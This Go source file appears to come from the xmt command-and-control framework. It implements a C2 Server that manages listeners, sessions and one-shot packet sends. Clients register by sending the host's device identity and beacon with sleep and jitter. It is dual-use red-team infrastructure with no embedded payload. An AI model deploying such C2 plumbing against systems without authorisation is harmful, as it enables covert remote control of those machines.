package c2

import (
	"context"
	"errors"
	"fmt"
	"net"
	"strings"

	"github.com/iDigitalFlame/logx/logx"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util"
)

var (
	// ErrNoConnector is a error returned by the Connect and Listen functions when
	// the Connector is nil and the provided Profile is also nil or does not inherit
	// the Connector interface.
	ErrNoConnector = errors.New("invalid or missing connector")
	// ErrEmptyPacket is a error returned by the Connect function when
	// the expected return result from the server was invalid or not expected.
	ErrEmptyPacket = errors.New("server sent an invalid response")
)

// Server is the manager for all C2 Listener and Sessions connection and states. This struct also manages all
// events and connection changes.
type Server struct {
	Log       logx.Log
	Scheduler *Scheduler

	ctx    context.Context
	new    chan *Listener
	close  chan string
	events chan event
	cancel context.CancelFunc
	active map[string]*Listener
}

type serverClient interface {
	Connect(string) (net.Conn, error)
}
type serverListener interface {
	Listen(string) (net.Listener, error)
}

// Wait will block until the current Server is closed and shutdown.
func (s *Server) Wait() {
	<-s.ctx.Done()
}
func (s *Server) listen() {
	s.Log.Debug("Server processing thread started!")
	for {
		select {
		case <-s.ctx.Done():
			s.shutdown()
			return
		case l := <-s.new:
			s.active[l.name] = l
		case r := <-s.close:
			delete(s.active, r)
		case e := <-s.events:
			e.process(s.Log)
		}
	}
}
func (s *Server) shutdown() {
	if s.Log == nil {
		s.Log = logx.Nop
	}
	s.Log.Debug("Stopping Server...")
	for n, v := range s.active {
		v.Close()
		delete(s.active, n)
	}
	s.active = nil
	close(s.close)
	close(s.events)
}

// Close stops the processing thread from this Server and releases all associated resources. This will
// signal the shutdown of all attached Listeners and Sessions.
func (s *Server) Close() error {
	s.cancel()
	return nil
}

// IsActive returns true if this Controller is still able to Process events.
func (s *Server) IsActive() bool {
	return s.ctx.Err() == nil
}

// NewServer creates a new Server instance for managing C2 Listeners and Sessions. If the supplied Log is
// nil, the 'logx.NOP' log will be used.
func NewServer(l logx.Log) *Server {
	return NewServerContext(context.Background(), l)
}

// NewServerContext creates a new Server instance for managing C2 Listeners and Sessions. If the supplied Log is
// nil, the 'logx.NOP' log will be used. This function will use the supplied Context as the base context for cancelation.
func NewServerContext(x context.Context, l logx.Log) *Server {
	s := &Server{
		Log:       l,
		new:       make(chan *Listener, 16),
		close:     make(chan string, 16),
		active:    make(map[string]*Listener),
		events:    make(chan event, limits.SmallLimit()),
		Scheduler: new(Scheduler),
	}
	s.ctx, s.cancel = context.WithCancel(x)
	if s.Log == nil {
		s.Log = logx.Nop
	}
	go s.listen()
	return s
}

// ConnectQuick creates a Session using the supplied Profile to connect to the listening server specified. A Session
// will be returned if the connection handshake succeeds. The '*Quick' functions infers the default Profile.
func (s *Server) ConnectQuick(a string, c serverClient) (*Session, error) {
	return s.ConnectWith(a, c, DefaultProfile, nil)
}

// OneshotQuick sends the packet with the specified data to the server and does NOT register the device
// with the Server. This is used for spending specific data segments in single use connections. The '*Quick' functions
// infers the default Profile.
func (s *Server) OneshotQuick(a string, c serverClient, d *com.Packet) error {
	return s.Oneshot(a, c, DefaultProfile, d)
}

// Connect creates a Session using the supplied Profile to connect to the listening server specified. A Session
// will be returned if the connection handshake succeeds.
func (s *Server) Connect(a string, c serverClient, p *Profile) (*Session, error) {
	return s.ConnectWith(a, c, p, nil)
}

// Oneshot sends the packet with the specified data to the server and does NOT register the device with the
// Server. This is used for spending specific data segments in single use connections.
func (s *Server) Oneshot(a string, c serverClient, p *Profile, d *com.Packet) error {
	if c == nil {
		return ErrNoConnector
	}
	var (
		w Wrapper
		t Transform
	)
	if p != nil {
		w = p.Wrapper
		t = p.Transform
	}
	n, err := c.Connect(a)
	if err != nil {
		return fmt.Errorf("unable to connect to %q: %w", a, err)
	}
	if d == nil {
		d = &com.Packet{ID: MsgPing}
	}
	d.Flags |= com.FlagOneshot
	err = writePacket(n, w, t, d)
	n.Close()
	if err != nil {
		return fmt.Errorf("unable to write packet: %w", err)
	}
	return nil
}

// Listen adds the Listener under the name provided. A Listener struct to control and receive callback functions
// is added to assist in manageing connections to this Listener.
func (s *Server) Listen(n, b string, c serverListener, p *Profile) (*Listener, error) {
	if c == nil {
		return nil, ErrNoConnector
	}
	x := strings.ToLower(n)
	if _, ok := s.active[x]; ok {
		return nil, fmt.Errorf("listener %q is already active", x)
	}
	h, err := c.Listen(b)
	if err != nil {
		return nil, fmt.Errorf("unable to listen on %q: %w", b, err)
	}
	if h == nil {
		return nil, fmt.Errorf("unable to listen on %q", b)
	}
	if s.Log == nil {
		s.Log = logx.Nop
	}
	l := &Listener{
		name:       x,
		close:      make(chan uint32, 64),
		sessions:   make(map[uint32]*Session),
		listener:   h,
		connection: connection{s: s, log: s.Log, Mux: s.Scheduler},
	}
	if p != nil {
		l.size = p.Size
		l.w, l.t = p.Wrapper, p.Transform
	}
	if l.size == 0 {
		l.size = uint(limits.MediumLimit())
	}
	l.ctx, l.cancel = context.WithCancel(s.ctx)
	s.Log.Debug("[%s] Added listener on %q!", x, b)
	s.new <- l
	go l.listen()
	return l, nil
}

// ConnectWith creates a Session using the supplied Profile to connect to the listening server specified. This
// function allows for passing the data Packet specified to the server with the initial registration. The data
// will be passed on normally.
func (s *Server) ConnectWith(a string, c serverClient, p *Profile, d *com.Packet) (*Session, error) {
	if c == nil {
		return nil, ErrNoConnector
	}
	n, err := c.Connect(a)
	if err != nil {
		return nil, fmt.Errorf("unable to connect to %q: %w", a, err)
	}
	defer n.Close()
	var (
		x uint
		l = &Session{ID: device.UUID, host: a, Device: *device.Local.Machine}
		v = &com.Packet{ID: MsgHello, Device: l.ID, Job: uint16(util.Rand.Uint32())}
	)
	if p != nil {
		l.sleep, l.jitter = p.Sleep, uint8(p.Jitter)
		l.w, l.t, x = p.Wrapper, p.Transform, p.Size
	}
	if l.sleep == 0 {
		l.sleep = DefaultSleep
	}
	if l.jitter > 100 {
		l.jitter = DefaultJitter
	}
	l.Device.MarshalStream(v)
	if d != nil {
		d.MarshalStream(v)
		v.Flags |= com.FlagData
	}
	v.Close()
	if err := writePacket(n, l.w, l.t, v); err != nil {
		return nil, fmt.Errorf("unable to write Packet: %w", err)
	}
	r, err := readPacket(n, l.w, l.t)
	if err != nil {
		return nil, fmt.Errorf("unable to read Packet: %w", err)
	}
	if r == nil || r.ID != MsgRegistered {
		return nil, ErrEmptyPacket
	}
	if s.Log == nil {
		s.Log = logx.Nop
	}
	s.Log.Debug("[%s] Client connected to %q!", l.ID, a)
	if x == 0 {
		x = uint(limits.MediumLimit())
	}
	l.socket = c.Connect
	l.wake = make(chan waker, 1)
	l.frags = make(map[uint16]*cluster)
	l.ctx, l.cancel = context.WithCancel(s.ctx)
	l.log, l.s, l.Mux = s.Log, s, DefaultClientMux
	l.send, l.recv = make(chan *com.Packet, x), make(chan *com.Packet, x)
	go l.listen()
	return l, nil
}
